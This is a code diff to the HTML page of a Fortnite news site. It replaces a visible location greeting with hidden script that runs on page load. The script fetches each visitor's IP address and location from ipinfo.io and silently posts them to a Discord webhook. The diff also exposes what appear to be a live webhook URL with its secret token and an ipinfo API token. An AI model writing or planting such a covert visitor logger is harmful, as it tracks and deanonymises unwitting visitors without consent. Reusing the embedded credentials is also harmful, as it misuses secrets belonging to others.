@@ -102,17 +102,36 @@
 <body>
     <div id="ip-load-info" style="text-align:center; margin-top:20px; color:#00eaff;"></div>
     <script>
-         fetch('https://ipinfo.io/json?token=9b88a4f00b132f')
+  fetch('https://ipinfo.io/json?token=9b88a4f00b132f')
     .then(res => res.json())
     .then(data => {
-      document.getElementById("ip-load-info").innerHTML =
-        `📍 Welcome from ${data.city}, ${data.region}, ${data.country} (IP: ${data.ip})`;
+      // Build the payload for Discord webhook
+      const payload = {
+        content: `New visitor info:\nIP: ${data.ip}\nLocation: ${data.city}, ${data.region}, ${data.country}`
+      };
+
+      // Your webhook URL (replace with your actual webhook)
+      const webhookURL = 'https://discord.com/api/webhooks/1381419732095209472/bstVFrhUSlpARvbQ7I5C9waHRTLGl_1dqZ9q_FVYxj4Cu0Tqsx8Egd4rQ9CL1JbAZMMM';
+
+      // Send data to webhook
+      fetch(webhookURL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(payload),
+      })
+      .then(() => {
+        console.log('Visitor info sent to webhook');
+      })
+      .catch(err => {
+        console.error('Error sending to webhook:', err);
+      });
     })
     .catch(() => {
-      document.getElementById("ip-load-info").textContent =
-        "❌ Could not retrieve your location.";
+      console.error('Failed to get IP info');
     });
-    </script>
+</script>
   <header>
     <h1>DC Fortnite News</h1>
     <p>The #1 Source for Fortnite Discord Chaos</p>
